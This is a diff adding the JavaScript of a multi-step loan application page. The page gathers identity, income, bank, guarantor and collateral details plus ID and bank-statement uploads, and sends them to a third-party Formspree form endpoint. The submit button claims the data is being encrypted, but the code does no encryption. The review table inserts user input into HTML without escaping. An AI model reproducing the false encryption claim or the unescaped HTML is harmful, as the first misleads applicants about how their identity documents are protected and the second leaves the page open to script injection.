+        document.getElementById('displayID').textContent = generatedVID;
+
+        // ---- STEP NAVIGATION ----
+        function goToStep(step) {
+            // Validate before moving forward
+            if (step > currentStep && !validateCurrentStep(currentStep)) {
+                shakeCard();
+                return;
+            }
+
+            // Hide all panels
+            document.querySelectorAll('.step-panel').forEach(p => p.classList.remove('active'));
+            // Show target panel
+            var targetPanel = document.querySelector('[data-panel="' + step + '"]');
+            if (targetPanel) targetPanel.classList.add('active');
+
+            currentStep = step;
+            updateProgressBar();
+            updateStepLabels();
+
+            // Trigger dynamic updates when entering certain steps
+            if (step === 4) updateDynamicDocs();
+            if (step === 5) buildReviewSummary();
+            if (step === 3) updateLoanTierInfo();
+
+            // Scroll to top of card
+            document.getElementById('portalCard').scrollIntoView({ behavior: 'smooth', block: 'start' });
+        }
+
+        function updateProgressBar() {
+            var pct = Math.round((currentStep / totalSteps) * 100);
+            document.getElementById('progressFill').style.width = pct + '%';
+        }
+
+        function updateStepLabels() {
+            var labels = document.querySelectorAll('#stepLabels .step-label');
+            labels.forEach((label, i) => {
+                var stepNum = i + 1;
+                label.classList.remove('active', 'done');
+                if (stepNum === currentStep) label.classList.add('active');
+                if (stepNum < currentStep) label.classList.add('done');
+            });
+        }
+
+        function shakeCard() {
+            var card = document.getElementById('portalCard');
+            card.style.transition = 'transform 0.1s ease';
+            card.style.transform = 'translateX(-6px)';
+            setTimeout(() => { card.style.transform = 'translateX(6px)'; }, 80);
+            setTimeout(() => { card.style.transform = 'translateX(-3px)'; }, 160);
+            setTimeout(() => { card.style.transform = 'translateX(0)'; }, 240);
+            setTimeout(() => { card.style.transition = '0.5s cubic-bezier(0.22, 1, 0.36, 1)'; }, 300);
+        }
+
+        // ---- VALIDATION PER STEP ----
+        function validateCurrentStep(step) {
+            if (step === 1) {
+                var fn = document.getElementById('firstName').value.trim();
+                var ln = document.getElementById('lastName').value.trim();
+                var em = document.getElementById('email').value.trim();
+                var ph = document.getElementById('phone').value.trim();
+                var db = document.getElementById('dob').value;
+                var ad = document.getElementById('address').value.trim();
+                if (!fn || !ln || !em || !ph || !db || !ad) {
+                    alert('Please fill all required fields in Step 1 (Identity).');
+                    return false;
+                }
+                if (!em.includes('@') || !em.includes('.')) {
+                    alert('Please enter a valid email address.');
+                    return false;
+                }
+            }
+            if (step === 2) {
+                var emp = document.getElementById('employmentStatus').value;
+                var inc = document.getElementById('monthlyIncome').value;
+                if (!emp || !inc) {
+                    alert('Please fill Employment Status and Monthly Income.');
+                    return false;
+                }
+            }
+            if (step === 3) {
+                var amt = document.getElementById('loanAmount').value;
+                var plan = document.getElementById('repaymentPlan').value;
+                if (!amt || !plan) {
+                    alert('Please fill Loan Amount and Repayment Plan.');
+                    return false;
+                }
+            }
+            // Step 4: basic ID file is required
+            if (step === 4) {
+                var fileID = document.getElementById('fileID').files.length;
+                if (fileID === 0) {
+                    alert('Please upload a valid ID card document.');
+                    return false;
+                }
+            }
+            return true;
+        }
+
+        // ---- DYNAMIC: OVERDUE REASON ----
+        function toggleOverdueReason() {
+            var sel = document.getElementById('overdueSelect').value;
+            var row = document.getElementById('overdueReasonRow');
+            row.style.display = sel === 'Yes' ? 'block' : 'none';
+        }
+
+        // ---- DYNAMIC: LOAN TIER INFO ----
+        function updateLoanTierInfo() {
+            var amt = parseFloat(document.getElementById('loanAmount').value) || 0;
+            var inc = parseFloat(document.getElementById('monthlyIncome').value) || 0;
+            var plan = document.getElementById('repaymentPlan').value;
+            var infoDiv = document.getElementById('loanTierInfo');
+            var tier = '';
+            var tierClass = '';
+            var note = '';
+
+            if (amt <= 200000) {
+                tier = 'Bronze Tier';
+                tierClass = 'bronze';
+                note = 'Basic verification required. Fast processing (6–12 hours).';
+            } else if (amt <= 500000) {
+                tier = 'Silver Tier';
+                tierClass = 'silver';
+                note = 'Standard verification. Processing within 12–24 hours.';
+            } else if (amt <= 2000000) {
+                tier = 'Gold Tier';
+                tierClass = 'gold-tier';
+                note = 'Enhanced verification + Guarantor required. Processing 24–48 hours.';
+            } else {
+                tier = 'Platinum Tier';
+                tierClass = 'platinum';
+                note = 'Full verification + Guarantor + Collateral required. Processing 48–72 hours.';
+            }
+
+            if (amt > 0) {
+                infoDiv.innerHTML =
+                    '<div class="info-alert"><i class="fas fa-info-circle"></i> <div><strong>' + tier +
+                    '</strong> — <span class="tier-badge ' + tierClass + '">' + tier +
+                    '</span><br><span style="font-size:11px;color:var(--text-muted);">' + note +
+                    '</span></div></div>';
+                if (amt > inc * 6 && inc > 0) {
+                    infoDiv.innerHTML +=
+                        '<div class="info-alert warning-alert"><i class="fas fa-exclamation-triangle"></i> Loan amount exceeds 6× your monthly income. Additional scrutiny may apply.</div>';
+                }
+            } else {
+                infoDiv.innerHTML = '';
+            }
+
+            // Also update dynamic docs & guarantor/collateral visibility if on step 4
+            updateDynamicDocs();
+        }
+
+        // ---- DYNAMIC DOCS FOR STEP 4 ----
+        function updateDynamicDocs() {
+            var amt = parseFloat(document.getElementById('loanAmount').value) || 0;
+            var container = document.getElementById('dynamicDocs');
+            var guarantorSec = document.getElementById('guarantorSection');
+            var collateralSec = document.getElementById('collateralSection');
+            var html = '';
+
+            if (amt > 200000) {
+                html +=
+                    '<div class="form-group" style="margin-bottom:12px;"><label><span class="required-star">*</span> Bank Statement (Last 3 months)</label><div class="upload-zone"><i class="fas fa-cloud-upload-alt"></i><p>Upload Bank Statement</p><span>PDF preferred • Max 10MB</span><input type="file" id="fileBankStmt" accept=".jpg,.jpeg,.png,.pdf" onchange="showFileName(this,\'fileListBank\')"></div><div class="file-list" id="fileListBank"></div></div>';
+            }
+            if (amt > 500000) {
+                html +=
+                    '<div class="form-group" style="margin-bottom:12px;"><label><span class="required-star">*</span> Proof of Income (Payslip, Tax Return, or Business Invoice)</label><div class="upload-zone"><i class="fas fa-cloud-upload-alt"></i><p>Upload Income Proof</p><span>JPG, PNG, or PDF • Max 5MB</span><input type="file" id="fileIncomeProof" accept=".jpg,.jpeg,.png,.pdf" onchange="showFileName(this,\'fileListIncome\')"></div><div class="file-list" id="fileListIncome"></div></div>';
+                html +=
+                    '<div class="form-group" style="margin-bottom:12px;"><label>Utility Bill (for address verification)</label><div class="upload-zone"><i class="fas fa-cloud-upload-alt"></i><p>Upload Utility Bill</p><span>JPG, PNG, or PDF • Max 5MB</span><input type="file" id="fileUtility" accept=".jpg,.jpeg,.png,.pdf" onchange="showFileName(this,\'fileListUtility\')"></div><div class="file-list" id="fileListUtility"></div></div>';
+            }
+            if (amt > 2000000) {
+                html +=
+                    '<div class="form-group" style="margin-bottom:12px;"><label><span class="required-star">*</span> Collateral Document (e.g. Vehicle Papers, Property Deed)</label><div class="upload-zone"><i class="fas fa-cloud-upload-alt"></i><p>Upload Collateral Document</p><span>JPG, PNG, or PDF • Max 10MB</span><input type="file" id="fileCollateralDoc" accept=".jpg,.jpeg,.png,.pdf" onchange="showFileName(this,\'fileListCollateral\')"></div><div class="file-list" id="fileListCollateral"></div></div>';
+            }
+
+            container.innerHTML = html;
+
+            // Show/hide guarantor & collateral sections
+            guarantorSec.style.display = amt > 500000 ? 'block' : 'none';
+            collateralSec.style.display = amt > 2000000 ? 'block' : 'none';
+        }
+
+        function showFileName(input, listId) {
+            var list = document.getElementById(listId);
+            if (input.files.length > 0) {
+                list.textContent = '✓ ' + input.files[0].name + ' (' + (input.files[0].size / 1024).toFixed(1) +
+                    ' KB)';
+                list.classList.add('show');
+            } else {
+                list.textContent = '';
+                list.classList.remove('show');
+            }
+        }
+
+        // ---- EMPLOYMENT CHANGE ----
+        function handleEmploymentChange() {
+            var status = document.getElementById('employmentStatus').value;
+            var empName = document.getElementById('employerName');
+            var yrsEmp = document.getElementById('yearsEmployed');
+            if (status === 'Unemployed' || status === 'Retired') {
+                empName.placeholder = 'N/A';
+                empName.value = '';
+                empName.disabled = true;
+                yrsEmp.placeholder = 'N/A';
+                yrsEmp.value = '';
+                yrsEmp.disabled = true;
+            } else {
+                empName.placeholder = 'Company or business name';
+                empName.disabled = false;
+                yrsEmp.placeholder = 'e.g. 3';
+                yrsEmp.disabled = false;
+            }
+        }
+
+        // ---- BUILD REVIEW SUMMARY ----
+        function buildReviewSummary() {
+            var data = {
+                'First Name': document.getElementById('firstName').value,
+                'Last Name': document.getElementById('lastName').value,
+                'Email': document.getElementById('email').value,
+                'Phone': document.getElementById('phone').value,
+                'DOB': document.getElementById('dob').value,
+                'Address': document.getElementById('address').value,
+                'Employment Status': document.getElementById('employmentStatus').value,
+                'Monthly Income': '₦' + (document.getElementById('monthlyIncome').value || '0'),
+                'Employer': document.getElementById('employerName').value || 'N/A',
+                'Years Employed': document.getElementById('yearsEmployed').value || 'N/A',
+                'Bank': document.getElementById('bankName').value || 'N/A',
+                'Loan Amount': '₦' + (document.getElementById('loanAmount').value || '0'),
+                'Repayment Plan': document.getElementById('repaymentPlan').value,
+                'Loan Purpose': document.getElementById('loanPurpose').value || 'N/A',
+                'Overdue History': document.getElementById('overdueSelect').value,
+                'Verification ID': generatedVID,
+            };
+
+            var html = '<table style="width:100%;border-collapse:collapse;">';
+            for (var key in data) {
+                html += '<tr style="border-bottom:1px solid var(--border);">';
+                html +=
+                    '<td style="padding:8px 6px;font-weight:600;color:var(--text-muted);font-size:11px;text-transform:uppercase;width:40%;">' +
+                    key + '</td>';
+                html += '<td style="padding:8px 6px;color:var(--text-primary);">' + data[key] + '</td>';
+                html += '</tr>';
+            }
+            html += '</table>';
+            document.getElementById('reviewContent').innerHTML = html;
+        }
+
+        // ---- SUBMIT APPLICATION ----
+        function submitApplication() {
+            var sig = document.getElementById('digitalSignature').value.trim();
+            var agreed = document.getElementById('agreeTerms').checked;
+            if (!sig) {
+                alert('Please type your full name as digital signature.');
+                shakeCard();
+                return;
+            }
+            if (!agreed) {
+                alert('Please agree to the terms and conditions.');
+                shakeCard();
+                return;
+            }
+
+            var btn = document.getElementById('submitBtn');
+            btn.disabled = true;
+            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Encrypting & Submitting...';
+
+            // --- Populate hidden form fields (native Formspree fallback) ---
+            document.getElementById('hfFirstName').value = document.getElementById('firstName').value;
+            document.getElementById('hfLastName').value = document.getElementById('lastName').value;
+            document.getElementById('hfEmail').value = document.getElementById('email').value;
+            document.getElementById('hfPhone').value = document.getElementById('phone').value;
+            document.getElementById('hfDob').value = document.getElementById('dob').value;
+            document.getElementById('hfAddress').value = document.getElementById('address').value;
+            document.getElementById('hfEmploymentStatus').value = document.getElementById('employmentStatus').value;
+            document.getElementById('hfMonthlyIncome').value = document.getElementById('monthlyIncome').value;
+            document.getElementById('hfEmployerName').value = document.getElementById('employerName').value || 'N/A';
+            document.getElementById('hfYearsEmployed').value = document.getElementById('yearsEmployed').value || 'N/A';
+            document.getElementById('hfBankName').value = document.getElementById('bankName').value || 'N/A';
+            document.getElementById('hfRequestedAmount').value = document.getElementById('loanAmount').value;
+            document.getElementById('hfRepaymentPlan').value = document.getElementById('repaymentPlan').value;
+            document.getElementById('hfLoanPurpose').value = document.getElementById('loanPurpose').value || 'N/A';
+            document.getElementById('hfEverOverdue').value = document.getElementById('overdueSelect').value;
+            document.getElementById('hfOverdueReason').value = document.getElementById('overdueReason').value || 'N/A';
+            document.getElementById('hfDigitalSignature').value = sig;
+            document.getElementById('hfVerificationID').value = generatedVID;
+            document.getElementById('hfSubmissionTime').value = new Date().toLocaleString();
+            document.getElementById('hfGuarantorName').value = document.getElementById('guarantorName').value || 'N/A';
+            document.getElementById('hfGuarantorPhone').value = document.getElementById('guarantorPhone').value || 'N/A';
+            document.getElementById('hfGuarantorEmail').value = document.getElementById('guarantorEmail').value || 'N/A';
+            document.getElementById('hfGuarantorRelation').value = document.getElementById('guarantorRelation').value || 'N/A';
+            document.getElementById('hfCollateralDesc').value = document.getElementById('collateralDesc').value || 'N/A';
+            document.getElementById('hfCollateralValue').value = document.getElementById('collateralValue').value || 'N/A';
+
+            // Build submission payload (for fetch)
+            var payload = new FormData();
+            payload.append('First_Name', document.getElementById('firstName').value);
+            payload.append('Last_Name', document.getElementById('lastName').value);
+            payload.append('Email', document.getElementById('email').value);
+            payload.append('Phone', document.getElementById('phone').value);
+            payload.append('DOB', document.getElementById('dob').value);
+            payload.append('Address', document.getElementById('address').value);
+            payload.append('Employment_Status', document.getElementById('employmentStatus').value);
+            payload.append('Monthly_Income', document.getElementById('monthlyIncome').value);
+            payload.append('Employer_Name', document.getElementById('employerName').value || 'N/A');
+            payload.append('Years_Employed', document.getElementById('yearsEmployed').value || 'N/A');
+            payload.append('Bank_Name', document.getElementById('bankName').value || 'N/A');
+            payload.append('Requested_Amount', document.getElementById('loanAmount').value);
+            payload.append('Repayment_Plan', document.getElementById('repaymentPlan').value);
+            payload.append('Loan_Purpose', document.getElementById('loanPurpose').value || 'N/A');
+            payload.append('Ever_Overdue', document.getElementById('overdueSelect').value);
+            payload.append('Overdue_Reason', document.getElementById('overdueReason').value || 'N/A');
+            payload.append('Digital_Signature', sig);
+            payload.append('Verification_ID', generatedVID);
+            payload.append('Submission_Time', new Date().toLocaleString());
+            payload.append('Guarantor_Name', document.getElementById('guarantorName').value || 'N/A');
+            payload.append('Guarantor_Phone', document.getElementById('guarantorPhone').value || 'N/A');
+            payload.append('Guarantor_Email', document.getElementById('guarantorEmail').value || 'N/A');
+            payload.append('Guarantor_Relation', document.getElementById('guarantorRelation').value || 'N/A');
+            payload.append('Collateral_Desc', document.getElementById('collateralDesc').value || 'N/A');
+            payload.append('Collateral_Value', document.getElementById('collateralValue').value || 'N/A');
+
+            // Attach files if present
+            var fileFields = ['fileID', 'fileBankStmt', 'fileIncomeProof', 'fileUtility', 'fileCollateralDoc'];
+            fileFields.forEach(function(fid) {
+                var el = document.getElementById(fid);
+                if (el && el.files && el.files.length > 0) {
+                    payload.append(fid, el.files[0]);
+                }
+            });
+
+            // Send to Formspree via fetch
+            fetch('https://formspree.io/f/xlgzvzka', {
+                    method: 'POST',
+                    body: payload,
+                    headers: { 'Accept': 'application/json' }
+                })
+                .then(function(response) {
+                    if (response.ok) {
+                        showSuccess();
+                    } else {
+                        // Fallback: submit native form (will redirect or show Formspree page)
+                        document.getElementById('appForm').submit();
+                    }
+                })
+                .catch(function() {
+                    // Network error? Submit native form
+                    document.getElementById('appForm').submit();
+                });
+
+            // Timeout fallback: if still no response after 6s, submit native form
+            setTimeout(function() {
+                if (document.getElementById('success-ui').style.display !== 'block') {
+                    document.getElementById('appForm').submit();
+                }
+            }, 6000);
+        }
+
+        function showSuccess() {
+            document.getElementById('formBody').style.display = 'none';
+            document.querySelector('.progress-section').style.display = 'none';
+            document.getElementById('success-ui').style.display = 'block';
+            document.getElementById('displayID').textContent = generatedVID;
+            document.getElementById('portalCard').scrollIntoView({ behavior: 'smooth', block: 'start' });
+        }
+
+        // ---- INITIALIZE ----
+        updateProgressBar();
+        updateStepLabels();
+        // Pre-set today as max date for DOB (must be 18+)
+        var dobInput = document.getElementById('dob');
+        if (dobInput) {
+            var maxDate = new Date();
+            maxDate.setFullYear(maxDate.getFullYear() - 18);
+            dobInput.max = maxDate.toISOString().split('T')[0];
+        }
+    </script>
+</body>
+</html>
